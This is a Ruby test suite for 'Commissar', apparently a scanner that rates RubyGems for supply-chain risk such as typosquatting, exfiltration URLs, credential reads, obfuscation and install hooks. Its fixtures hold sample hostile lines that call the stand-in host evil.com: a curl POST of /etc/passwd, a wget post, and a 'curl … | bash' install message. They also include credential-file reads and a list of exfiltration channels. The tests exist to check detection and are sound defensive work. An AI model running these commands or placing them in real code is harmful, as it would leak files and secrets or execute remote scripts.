require "minitest/autorun"
require "tmpdir"
require "fileutils"
require "stringio"
require_relative "../lib/commissar"

module GemFixtureHelper
	def build_fixture_gem(files)
		files.each do |path, content|
			full = File.join(@tmpdir, path)
			FileUtils.mkdir_p(File.dirname(full))
			File.write(full, content)
		end

		spec = Gem::Specification.new do |s|
			s.name    = "fixture-gem"
			s.version = "0.0.1"
			s.summary = "fixture"
			s.authors = ["Test"]
			s.email   = ["t@t.com"]
			s.files   = files.keys
		end

		gem_filename = nil
		silence { Dir.chdir(@tmpdir) { gem_filename = Gem::Package.build(spec) } }
		File.join(@tmpdir, gem_filename)
	end

	def silence
		orig_out = $stdout
		orig_err = $stderr
		$stdout = StringIO.new
		$stderr = StringIO.new
		yield
	ensure
		$stdout = orig_out
		$stderr = orig_err
	end
end

class TestSafeRead < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
		@tmpdir  = Dir.mktmpdir("commissar_test_")
	end

	def teardown
		FileUtils.rm_rf(@tmpdir)
	end

	def test_reads_utf8_file
		path = File.join(@tmpdir, "test.rb")
		File.write(path, "puts 'hello'\n")
		assert_equal "puts 'hello'\n", @scanner.send(:safe_read, path)
	end

	def test_handles_binary_content
		path = File.join(@tmpdir, "binary.bin")
		File.binwrite(path, "\xFF\xFE\x00\x01binary")
		refute_nil @scanner.send(:safe_read, path)
	end

	def test_returns_nil_for_missing_file
		assert_nil @scanner.send(:safe_read, "/nonexistent/commissar_xyz.rb")
	end
end

class TestUnpackGem < Minitest::Test
	include GemFixtureHelper

	def setup
		@scanner = Commissar::Scanner.new("fixture-gem")
		@tmpdir  = Dir.mktmpdir("commissar_test_")
	end

	def teardown
		FileUtils.rm_rf(@tmpdir)
	end

	def test_unpack_populates_files
		gem_path = build_fixture_gem("lib/hello.rb" => "puts 'hello'\n")
		files = @scanner.send(:unpack_gem, gem_path)
		assert files.key?("lib/hello.rb")
	end

	def test_unpack_reads_file_content
		gem_path = build_fixture_gem("lib/hello.rb" => "puts 'hello world'\n")
		files = @scanner.send(:unpack_gem, gem_path)
		assert_includes files["lib/hello.rb"], "hello world"
	end

	def test_unpack_handles_multiple_files
		gem_path = build_fixture_gem(
			"lib/a.rb" => "module A; end\n",
			"lib/b.rb" => "module B; end\n"
		)
		files = @scanner.send(:unpack_gem, gem_path)
		assert files.key?("lib/a.rb")
		assert files.key?("lib/b.rb")
	end

	def test_unpack_returns_empty_hash_for_corrupt_gem
		corrupt = File.join(@tmpdir, "bad.gem")
		File.write(corrupt, "not a gem")
		files = @scanner.send(:unpack_gem, corrupt)
		assert_equal({}, files)
	end
end

class TestLevenshtein < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_identical_strings
		assert_equal 0, @scanner.send(:levenshtein, "rails", "rails")
	end

	def test_single_insertion
		assert_equal 1, @scanner.send(:levenshtein, "rais", "rails")
	end

	def test_single_deletion
		assert_equal 1, @scanner.send(:levenshtein, "raills", "rails")
	end

	def test_single_substitution
		assert_equal 1, @scanner.send(:levenshtein, "rxils", "rails")
	end

	def test_two_edits
		assert_equal 2, @scanner.send(:levenshtein, "ralis", "rails")
	end

	def test_completely_different
		assert_equal 4, @scanner.send(:levenshtein, "hello", "rails")
	end

	def test_empty_strings
		assert_equal 0, @scanner.send(:levenshtein, "", "")
	end

	def test_one_empty
		assert_equal 5, @scanner.send(:levenshtein, "rails", "")
	end
end

class TestCheckTyposquatting < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_finding_for_exact_match_to_top_gem
		scanner = Commissar::Scanner.new("rails")
		scanner.instance_eval { check_typosquatting }
		assert_empty scanner.findings
	end

	def test_med_finding_for_distance_1
		scanner = Commissar::Scanner.new("rxils")
		scanner.instance_eval { check_typosquatting }
		assert_finding_with(scanner, severity: "MED", message: /rails/)
	end

	def test_low_finding_for_distance_2
		scanner = Commissar::Scanner.new("ralis")
		scanner.instance_eval { check_typosquatting }
		assert_finding_with(scanner, severity: "LOW", message: /Levenshtein distance: 2/)
	end

	def test_no_finding_for_distance_3_or_more
		scanner = Commissar::Scanner.new("xyzgem")
		scanner.instance_eval { check_typosquatting }
		assert_empty scanner.findings
	end

	def test_no_finding_for_unrelated_gem
		scanner = Commissar::Scanner.new("completely-unrelated-gem-name")
		scanner.instance_eval { check_typosquatting }
		assert_empty scanner.findings
	end

	private

	def assert_finding_with(scanner, severity:, message:)
		match = scanner.findings.find { |f| f.severity == severity && f.message.match?(message) }
		assert match, "Expected #{severity} finding matching #{message}, got: #{scanner.findings.map(&:to_s)}"
	end
end

class TestCheckVersionDiff < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
		@scanner.instance_variable_set(:@version, "1.0.1")
		@scanner.instance_variable_set(:@files, {
			"lib/a.rb" => "module A; end\n",
			"lib/b.rb" => "module B; end\n",
			"lib/c.rb" => "module C; end\n"
		})
	end

	def test_no_findings_when_identical
		prev = {
			"lib/a.rb" => "module A; end\n",
			"lib/b.rb" => "module B; end\n",
			"lib/c.rb" => "module C; end\n"
		}
		run_diff(prev)
		assert_empty @scanner.findings
	end

	def test_low_finding_for_new_file
		prev = { "lib/a.rb" => "module A; end\n", "lib/b.rb" => "module B; end\n" }
		run_diff(prev)
		assert_finding_with(severity: "LOW", message: /lib\/c\.rb/)
	end

	def test_low_finding_for_removed_file
		prev = {
			"lib/a.rb" => "module A; end\n",
			"lib/b.rb" => "module B; end\n",
			"lib/c.rb" => "module C; end\n",
			"lib/d.rb" => "module D; end\n"
		}
		run_diff(prev)
		assert_finding_with(severity: "LOW", message: /lib\/d\.rb/)
	end

	def test_low_finding_for_modified_file
		prev = {
			"lib/a.rb" => "module A; end\n",
			"lib/b.rb" => "CHANGED CONTENT\n",
			"lib/c.rb" => "module C; end\n"
		}
		run_diff(prev)
		assert_finding_with(severity: "LOW", message: /lib\/b\.rb/)
	end

	def test_detects_multiple_changes
		prev = { "lib/a.rb" => "module A; end\n" }
		run_diff(prev)
		assert_equal 2, @scanner.findings.size
	end

	private

	def run_diff(prev_files)
		@scanner.instance_eval { check_version_diff(prev_files, "1.0.0") }
	end

	def assert_finding_with(severity:, message:)
		match = @scanner.findings.find { |f| f.severity == severity && f.message.match?(message) }
		assert match, "Expected #{severity} finding matching #{message}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestVersion < Minitest::Test
	def test_version_is_defined
		refute_nil Commissar::VERSION
	end

	def test_version_is_string
		assert_kind_of String, Commissar::VERSION
	end

	def test_version_matches_semver
		assert_match(/\A\d+\.\d+\.\d+\z/, Commissar::VERSION)
	end
end

class TestConfig < Minitest::Test
	FIXTURE_DIR = File.expand_path("fixtures", __dir__)

	def test_load_returns_entries_only
		result = load_fixture("test_config.txt")
		assert_equal ["entry_one", "entry_two", "entry_three"], result
	end

	def test_load_strips_comments
		result = load_fixture("test_config.txt")
		refute(result.any? { |l| l.start_with?("#") })
	end

	def test_load_strips_blank_lines
		result = load_fixture("test_config.txt")
		refute_includes result, ""
	end

	def test_load_returns_empty_for_missing_file
		result = Commissar::Config.load("nonexistent_file_xyz.txt")
		assert_equal [], result
	end

	def test_resolve_returns_nil_for_missing_file
		result = Commissar::Config.resolve("nonexistent_file_xyz.txt")
		assert_nil result
	end

	private

	def load_fixture(filename)
		path = File.join(FIXTURE_DIR, filename)
		File.readlines(path, chomp: true)
			.reject { |l| l.strip.empty? || l.strip.start_with?("#") }
	end
end

class TestFinding < Minitest::Test
	def test_high_weight
		f = finding(severity: "HIGH")
		assert_equal 15, f.weight
	end

	def test_med_weight
		f = finding(severity: "MED")
		assert_equal 7, f.weight
	end

	def test_low_weight
		f = finding(severity: "LOW")
		assert_equal 2, f.weight
	end

	def test_unknown_severity_weight_is_zero
		f = finding(severity: "UNKNOWN")
		assert_equal 0, f.weight
	end

	def test_to_s_with_file_and_line
		f = finding(severity: "HIGH", message: "eval found", file: "lib/foo.rb", line: 42)
		assert_includes f.to_s, "lib/foo.rb:42"
		assert_includes f.to_s, "eval found"
		assert_includes f.to_s, "[HIGH]"
	end

	def test_to_s_without_location
		f = finding(severity: "LOW", message: "something", file: nil, line: nil)
		refute_includes f.to_s, "→"
	end

	def test_to_s_severity_is_padded
		f = finding(severity: "MED")
		assert_includes f.to_s, "[MED ]"
	end

	private

	def finding(severity:, message: "test message", file: nil, line: nil)
		Commissar::Finding.new(
			category: "TEST",
			severity: severity,
			message: message,
			file: file,
			line: line
		)
	end
end

class TestCheckVersionAge < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_finding_when_version_is_old
		set_metadata("version_created_at" => (Time.now - 73 * 3600).iso8601)
		run_check
		assert_empty @scanner.findings
	end

	def test_no_finding_at_exactly_72h
		set_metadata("version_created_at" => (Time.now - 72 * 3600).iso8601)
		run_check
		assert_empty @scanner.findings
	end

	def test_low_finding_when_version_recent
		set_metadata("version_created_at" => (Time.now - 14 * 3600).iso8601)
		run_check
		assert_finding_with(severity: "LOW", message: /14h ago/)
	end

	def test_low_finding_when_version_very_recent
		set_metadata("version_created_at" => (Time.now - 1 * 3600).iso8601)
		run_check
		assert_finding_with(severity: "LOW", message: /1h ago/)
	end

	def test_no_finding_when_timestamp_missing
		set_metadata({})
		run_check
		assert_empty @scanner.findings
	end

	private

	def set_metadata(data)
		@scanner.instance_variable_set(:@metadata, data)
	end

	def run_check
		@scanner.instance_eval { check_version_age }
	end

	def assert_finding_with(severity:, message:)
		match = @scanner.findings.find { |f| f.severity == severity && f.message.match?(message) }
		assert match, "Expected a #{severity} finding matching #{message}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestParseConfigEntry < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_parses_high_prefix
		severity, pattern = @scanner.send(:parse_config_entry, "HIGH:api.telegram.org")
		assert_equal "HIGH", severity
		assert_equal "api.telegram.org", pattern
	end

	def test_parses_med_prefix
		severity, pattern = @scanner.send(:parse_config_entry, "MED:pastebin.com")
		assert_equal "MED", severity
		assert_equal "pastebin.com", pattern
	end

	def test_parses_low_prefix
		severity, pattern = @scanner.send(:parse_config_entry, "LOW:binding")
		assert_equal "LOW", severity
		assert_equal "binding", pattern
	end

	def test_defaults_to_med_without_prefix
		severity, pattern = @scanner.send(:parse_config_entry, "somepattern.com")
		assert_equal "MED", severity
		assert_equal "somepattern.com", pattern
	end
end

class TestRunUrlChecks < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_findings_on_clean_file
		set_files("lib/clean.rb" => "puts 'hello world'\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_high_finding_for_telegram_url
		set_files("lib/evil.rb" => "Net::HTTP.get(URI('https://api.telegram.org/bot123/sendMessage'))\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /api\.telegram\.org/, file: "lib/evil.rb", line: 1)
	end

	def test_med_finding_for_pastebin_url
		set_files("lib/evil.rb" => "url = 'https://pastebin.com/raw/abc123'\n")
		run_check
		assert_finding_with(severity: "MED", message: /pastebin\.com/, file: "lib/evil.rb", line: 1)
	end

	def test_reports_correct_line_number
		content = "clean_line\nanother_clean_line\nhttps://discord.com/api/webhooks/123\n"
		set_files("lib/evil.rb" => content)
		run_check
		assert_finding_with(severity: "HIGH", message: /discord\.com/, file: "lib/evil.rb", line: 3)
	end

	def test_detects_across_multiple_files
		set_files(
			"lib/a.rb" => "call('https://api.telegram.org/bot/x')\n",
			"lib/b.rb" => "fetch('https://pastebin.com/raw/abc')\n"
		)
		run_check
		assert_equal 2, @scanner.findings.size
	end

	def test_no_findings_when_files_empty
		set_files({})
		run_check
		assert_empty @scanner.findings
	end

	def test_skips_nil_file_content
		set_files("lib/binary.so" => nil)
		run_check
		assert_empty @scanner.findings
	end

	private

	def set_files(files)
		@scanner.instance_variable_set(:@files, files)
	end

	def run_check
		@scanner.instance_eval { run_url_checks }
	end

	def assert_finding_with(severity:, message:, file: nil, line: nil)
		match = @scanner.findings.find do |f|
			f.severity == severity &&
				f.message.match?(message) &&
				(file.nil? || f.file == file) &&
				(line.nil? || f.line == line)
		end
		assert match, "Expected #{severity} finding matching #{message} at #{file}:#{line}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestRunFunctionChecks < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_findings_on_clean_file
		set_files("lib/clean.rb" => "puts 'hello'\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_high_finding_for_eval
		set_files("lib/evil.rb" => "eval(user_input)\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /\Aeval\z/, file: "lib/evil.rb", line: 1)
	end

	def test_med_finding_for_net_http
		set_files("lib/evil.rb" => "Net::HTTP.get(uri)\n")
		run_check
		assert_finding_with(severity: "MED", message: /Net::HTTP/)
	end

	def test_low_finding_for_binding
		set_files("lib/suspicious.rb" => "b = binding\n")
		run_check
		assert_finding_with(severity: "LOW", message: /binding/)
	end

	def test_reports_correct_line_number
		content = "x = 1\ny = 2\neval(something)\n"
		set_files("lib/evil.rb" => content)
		run_check
		assert_finding_with(severity: "HIGH", message: /\Aeval\z/, file: "lib/evil.rb", line: 3)
	end

	private

	def set_files(files)
		@scanner.instance_variable_set(:@files, files)
	end

	def run_check
		@scanner.instance_eval { run_function_checks }
	end

	def assert_finding_with(severity:, message:, file: nil, line: nil)
		match = @scanner.findings.find do |f|
			f.severity == severity &&
				f.message.match?(message) &&
				(file.nil? || f.file == file) &&
				(line.nil? || f.line == line)
		end
		assert match, "Expected #{severity} finding matching #{message} at #{file}:#{line}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestRunShellChecks < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_findings_on_clean_file
		set_files("ext/extconf.rb" => "require 'mkmf'\ncreate_makefile('myext')\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_high_finding_for_curl_post
		set_files("ext/extconf.rb" => "system('curl -X POST https://evil.com -d @/etc/passwd')\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /curl -X POST/, file: "ext/extconf.rb", line: 1)
	end

	def test_med_finding_for_ruby_http_post
		set_files("lib/evil.rb" => "req = Net::HTTP::Post.new(uri)\n")
		run_check
		assert_finding_with(severity: "MED", message: /Net::HTTP::Post\.new/)
	end

	def test_reports_correct_line_number
		content = "x = setup\ny = prepare\nsystem('wget --post-data payload http://evil.com')\n"
		set_files("Rakefile" => content)
		run_check
		assert_finding_with(severity: "HIGH", message: /wget --post-data/, file: "Rakefile", line: 3)
	end

	private

	def set_files(files)
		@scanner.instance_variable_set(:@files, files)
	end

	def run_check
		@scanner.instance_eval { run_shell_checks }
	end

	def assert_finding_with(severity:, message:, file: nil, line: nil)
		match = @scanner.findings.find do |f|
			f.severity == severity &&
				f.message.match?(message) &&
				(file.nil? || f.file == file) &&
				(line.nil? || f.line == line)
		end
		assert match, "Expected #{severity} finding matching #{message} at #{file}:#{line}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestRunCredentialChecks < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_findings_on_clean_file
		set_files("lib/clean.rb" => "puts ENV['HOME']\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_high_finding_for_aws_key
		set_files("lib/evil.rb" => "key = ENV[\"AWS_ACCESS_KEY_ID\"]\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /AWS_ACCESS_KEY_ID/, file: "lib/evil.rb", line: 1)
	end

	def test_high_finding_for_github_token
		set_files("lib/evil.rb" => "token = ENV[\"GITHUB_TOKEN\"]\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /GITHUB_TOKEN/)
	end

	def test_med_finding_for_dotenv
		set_files("lib/evil.rb" => "Dotenv.load('.env')\n")
		run_check
		assert_finding_with(severity: "MED", message: /\.env/)
	end

	def test_reports_correct_line_number
		content = "setup\nconfig\nFile.read(File.expand_path('~/.aws/credentials'))\n"
		set_files("lib/evil.rb" => content)
		run_check
		assert_finding_with(severity: "HIGH", message: %r{\.aws/credentials}, file: "lib/evil.rb", line: 3)
	end

	private

	def set_files(files)
		@scanner.instance_variable_set(:@files, files)
	end

	def run_check
		@scanner.instance_eval { run_credential_checks }
	end

	def assert_finding_with(severity:, message:, file: nil, line: nil)
		match = @scanner.findings.find do |f|
			f.severity == severity &&
				f.message.match?(message) &&
				(file.nil? || f.file == file) &&
				(line.nil? || f.line == line)
		end
		assert match, "Expected #{severity} finding matching #{message} at #{file}:#{line}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestRunEncodingChecks < Minitest::Test
	HIGH_ENTROPY_LINE = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789aAbBcCdDeEfFgGhHiI"
	LOW_ENTROPY_LINE  = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	LONG_LINE         = "x" * 501
	HOMOGLYPH_LINE    = "def аuthorize"

	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_findings_on_clean_file
		set_files("lib/clean.rb" => "def initialize(name)\n  @name = name\nend\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_high_finding_for_high_entropy_line
		set_files("lib/evil.rb" => HIGH_ENTROPY_LINE + "\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /entropy/, file: "lib/evil.rb", line: 1)
	end

	def test_no_finding_for_low_entropy_line
		set_files("lib/clean.rb" => LOW_ENTROPY_LINE + "\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_no_finding_for_short_high_entropy_line
		set_files("lib/clean.rb" => "aB3!xZ\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_med_finding_for_long_line
		set_files("lib/evil.rb" => LONG_LINE + "\n")
		run_check
		assert_finding_with(severity: "MED", message: /501 chars/, file: "lib/evil.rb", line: 1)
	end

	def test_high_finding_for_homoglyphs
		set_files("lib/evil.rb" => HOMOGLYPH_LINE + "\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /homoglyph/i, file: "lib/evil.rb", line: 1)
	end

	def test_no_finding_for_normal_ascii
		set_files("lib/clean.rb" => "authorize(user, resource)\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_reports_correct_line_number
		content = "clean_line\n" + HIGH_ENTROPY_LINE + "\n"
		set_files("lib/evil.rb" => content)
		run_check
		assert_finding_with(severity: "HIGH", message: /entropy/, file: "lib/evil.rb", line: 2)
	end

	private

	def set_files(files)
		@scanner.instance_variable_set(:@files, files)
	end

	def run_check
		@scanner.instance_eval { run_encoding_checks }
	end

	def assert_finding_with(severity:, message:, file: nil, line: nil)
		match = @scanner.findings.find do |f|
			f.severity == severity &&
				f.message.match?(message) &&
				(file.nil? || f.file == file) &&
				(line.nil? || f.line == line)
		end
		assert match, "Expected #{severity} finding matching #{message} at #{file}:#{line}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestRunWeb3Checks < Minitest::Test
	ETH_ADDRESS = "0xAbCdEf1234567890AbCdEf1234567890AbCdEf12"
	BTC_ADDRESS = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"

	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_findings_on_clean_file
		set_files("lib/clean.rb" => "puts 'hello world'\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_high_finding_for_eth_address
		set_files("lib/evil.rb" => "addr = \"#{ETH_ADDRESS}\"\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /ETH wallet/, file: "lib/evil.rb", line: 1)
	end

	def test_high_finding_for_btc_address
		set_files("lib/evil.rb" => "addr = \"#{BTC_ADDRESS}\"\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /BTC wallet/, file: "lib/evil.rb", line: 1)
	end

	def test_high_finding_for_clipboard_access
		set_files("lib/evil.rb" => "system('pbcopy', input)\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /pbcopy/)
	end

	def test_high_finding_for_clipboard_gem
		set_files("lib/evil.rb" => "Clipboard.copy(wallet_address)\n")
		run_check
		assert_finding_with(severity: "HIGH", message: /Clipboard/)
	end

	def test_low_finding_for_metamask_reference
		set_files("lib/suspicious.rb" => "# connects to metamask\n")
		run_check
		assert_finding_with(severity: "LOW", message: /metamask/)
	end

	def test_low_finding_for_web3_reference
		set_files("lib/suspicious.rb" => "require 'ethers'\n")
		run_check
		assert_finding_with(severity: "LOW", message: /ethers/)
	end

	def test_reports_correct_line_number
		content = "setup\n\naddr = \"#{ETH_ADDRESS}\"\n"
		set_files("lib/evil.rb" => content)
		run_check
		assert_finding_with(severity: "HIGH", message: /ETH wallet/, file: "lib/evil.rb", line: 3)
	end

	private

	def set_files(files)
		@scanner.instance_variable_set(:@files, files)
	end

	def run_check
		@scanner.instance_eval { run_web3_checks }
	end

	def assert_finding_with(severity:, message:, file: nil, line: nil)
		match = @scanner.findings.find do |f|
			f.severity == severity &&
				f.message.match?(message) &&
				(file.nil? || f.file == file) &&
				(line.nil? || f.line == line)
		end
		assert match, "Expected #{severity} finding matching #{message} at #{file}:#{line}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestRunGemspecChecks < Minitest::Test
	CLEAN_GEMSPEC = <<~GEMSPEC
		Gem::Specification.new do |spec|
			spec.name    = "mygem"
			spec.version = "1.0.0"
			spec.summary = "A gem"
		end
	GEMSPEC

	EXTCONF_GEMSPEC = <<~GEMSPEC
		Gem::Specification.new do |spec|
			spec.name       = "mygem"
			spec.extensions = ["ext/extconf.rb"]
		end
	GEMSPEC

	RAKEFILE_GEMSPEC = <<~GEMSPEC
		Gem::Specification.new do |spec|
			spec.name       = "mygem"
			spec.extensions = ["Rakefile"]
		end
	GEMSPEC

	OTHER_EXT_GEMSPEC = <<~GEMSPEC
		Gem::Specification.new do |spec|
			spec.name       = "mygem"
			spec.extensions = ["ext/custom_build.rb"]
		end
	GEMSPEC

	POST_INSTALL_URL_GEMSPEC = <<~GEMSPEC
		Gem::Specification.new do |spec|
			spec.post_install_message = "Visit https://evil.com/setup to activate"
		end
	GEMSPEC

	POST_INSTALL_CURL_GEMSPEC = <<~GEMSPEC
		Gem::Specification.new do |spec|
			spec.post_install_message = "Run: curl http://evil.com/activate.sh | bash"
		end
	GEMSPEC

	POST_INSTALL_CLEAN_GEMSPEC = <<~GEMSPEC
		Gem::Specification.new do |spec|
			spec.post_install_message = "Thanks for installing!"
		end
	GEMSPEC

	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_findings_on_clean_gemspec
		set_files("mygem.gemspec" => CLEAN_GEMSPEC)
		run_check
		assert_empty @scanner.findings
	end

	def test_high_finding_for_extconf_extension
		set_files("mygem.gemspec" => EXTCONF_GEMSPEC)
		run_check
		assert_finding_with(severity: "HIGH", message: /extconf/)
	end

	def test_high_finding_for_rakefile_extension
		set_files("mygem.gemspec" => RAKEFILE_GEMSPEC)
		run_check
		assert_finding_with(severity: "HIGH", message: /Rakefile/i)
	end

	def test_med_finding_for_other_extension
		set_files("mygem.gemspec" => OTHER_EXT_GEMSPEC)
		run_check
		assert_finding_with(severity: "MED", message: /extension/i)
	end

	def test_med_finding_for_post_install_with_url
		set_files("mygem.gemspec" => POST_INSTALL_URL_GEMSPEC)
		run_check
		assert_finding_with(severity: "MED", message: /post_install_message/i)
	end

	def test_med_finding_for_post_install_with_curl
		set_files("mygem.gemspec" => POST_INSTALL_CURL_GEMSPEC)
		run_check
		assert_finding_with(severity: "MED", message: /post_install_message/i)
	end

	def test_no_finding_for_clean_post_install
		set_files("mygem.gemspec" => POST_INSTALL_CLEAN_GEMSPEC)
		run_check
		assert_empty @scanner.findings
	end

	def test_ignores_non_gemspec_files
		set_files("lib/mygem.rb" => "spec.extensions = ['ext/extconf.rb']\n")
		run_check
		assert_empty @scanner.findings
	end

	def test_extconf_finding_reports_correct_line
		set_files("mygem.gemspec" => EXTCONF_GEMSPEC)
		run_check
		f = @scanner.findings.first
		assert_equal "mygem.gemspec", f.file
		refute_nil f.line
	end

	private

	def set_files(files)
		@scanner.instance_variable_set(:@files, files)
	end

	def run_check
		@scanner.instance_eval { run_gemspec_checks }
	end

	def assert_finding_with(severity:, message:, file: nil, line: nil)
		match = @scanner.findings.find do |f|
			f.severity == severity &&
				f.message.match?(message) &&
				(file.nil? || f.file == file) &&
				(line.nil? || f.line == line)
		end
		assert match, "Expected #{severity} finding matching #{message} at #{file}:#{line}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestCheckOwnerChanges < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_finding_with_multiple_owners
		set_owners([{ "handle" => "alice" }, { "handle" => "bob" }])
		run_check
		assert_empty @scanner.findings
	end

	def test_low_finding_with_single_owner
		set_owners([{ "handle" => "alice" }])
		run_check
		assert_finding_with(severity: "LOW", message: /alice/)
	end

	def test_med_finding_with_single_owner_on_new_gem
		set_owners([{ "handle" => "alice" }])
		set_metadata("created_at" => (Time.now - 10 * 86400).iso8601)
		run_check
		assert_finding_with(severity: "MED", message: /alice/)
		assert_equal 1, @scanner.findings.size
	end

	def test_no_finding_when_owners_nil
		set_owners(nil)
		run_check
		assert_empty @scanner.findings
	end

	def test_no_finding_when_owners_empty
		set_owners([])
		run_check
		assert_empty @scanner.findings
	end

	private

	def set_owners(owners)
		@scanner.instance_variable_set(:@owners, owners)
	end

	def set_metadata(data)
		@scanner.instance_variable_set(:@metadata, data)
	end

	def run_check
		@scanner.instance_eval { check_owner_changes }
	end

	def assert_finding_with(severity:, message:)
		match = @scanner.findings.find { |f| f.severity == severity && f.message.match?(message) }
		assert match, "Expected a #{severity} finding matching #{message}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestCheckMissingUris < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_no_findings_when_both_uris_present
		set_metadata("homepage_uri" => "https://example.com", "source_code_uri" => "https://github.com/x/y")
		run_check
		assert_empty @scanner.findings
	end

	def test_low_finding_when_homepage_missing
		set_metadata("homepage_uri" => nil, "source_code_uri" => "https://github.com/x/y")
		run_check
		assert_finding_with(severity: "LOW", message: /homepage_uri/)
	end

	def test_low_finding_when_source_code_uri_missing
		set_metadata("homepage_uri" => "https://example.com", "source_code_uri" => nil)
		run_check
		assert_finding_with(severity: "LOW", message: /source_code_uri/)
	end

	def test_med_finding_when_both_uris_missing
		set_metadata("homepage_uri" => nil, "source_code_uri" => nil)
		run_check
		assert_finding_with(severity: "MED", message: /no source/i)
		assert_equal 1, @scanner.findings.size
	end

	def test_empty_string_treated_as_missing
		set_metadata("homepage_uri" => "", "source_code_uri" => "https://github.com/x/y")
		run_check
		assert_finding_with(severity: "LOW", message: /homepage_uri/)
	end

	private

	def set_metadata(data)
		@scanner.instance_variable_set(:@metadata, data)
	end

	def run_check
		@scanner.instance_eval { check_missing_uris }
	end

	def assert_finding_with(severity:, message:)
		match = @scanner.findings.find { |f| f.severity == severity && f.message.match?(message) }
		assert match, "Expected a #{severity} finding matching #{message}, got: #{@scanner.findings.map(&:to_s)}"
	end
end

class TestScannerRiskScore < Minitest::Test
	def setup
		@scanner = Commissar::Scanner.new("fake-gem")
	end

	def test_risk_score_zero_with_no_findings
		assert_equal 0, @scanner.risk_score
	end

	def test_risk_score_sums_finding_weights
		add_finding(@scanner, "HIGH")
		add_finding(@scanner, "MED")
		assert_equal 22, @scanner.risk_score
	end

	def test_risk_score_caps_at_100
		10.times { add_finding(@scanner, "HIGH") }
		assert_equal 100, @scanner.risk_score
	end

	def test_findings_start_empty
		assert_empty @scanner.findings
	end

	private

	def add_finding(scanner, severity)
		scanner.instance_eval do
			add_finding(
				category: "TEST",
				severity: severity,
				message: "test"
			)
		end
	end
end
